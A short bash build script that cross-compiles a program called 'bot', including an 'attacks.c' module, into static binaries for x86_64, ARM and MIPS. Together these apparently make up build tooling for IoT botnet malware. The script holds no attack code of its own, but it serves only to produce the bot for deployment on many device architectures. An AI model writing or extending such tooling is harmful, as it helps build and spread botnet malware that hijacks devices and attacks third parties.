#!/bin/bash

echo "Building bots with different architecture names..."

mkdir -p binaries

# Build x86_64 with arch name "x86_64"
echo "  Building x86_64..."
gcc -o binaries/bot_x86_64 bot/bot.c bot/hmac.c bot/attacks.c -lpthread -ldl -Wall -O2 -DARCH_NAME='"x86_64"'

# Build ARM with arch name "arm"
echo "  Building ARM..."
arm-linux-gnueabi-gcc -o binaries/bot_arm bot/bot.c bot/hmac.c bot/attacks.c -lpthread -ldl -static -O2 -DARCH_NAME='"arm"'

# Build MIPS with arch name "mips"
echo "  Building MIPS..."
mips-linux-gnu-gcc -o binaries/bot_mips bot/bot.c bot/hmac.c bot/attacks.c -lpthread -ldl -static -O2 -DARCH_NAME='"mips"'

echo "Done!"
file binaries/*
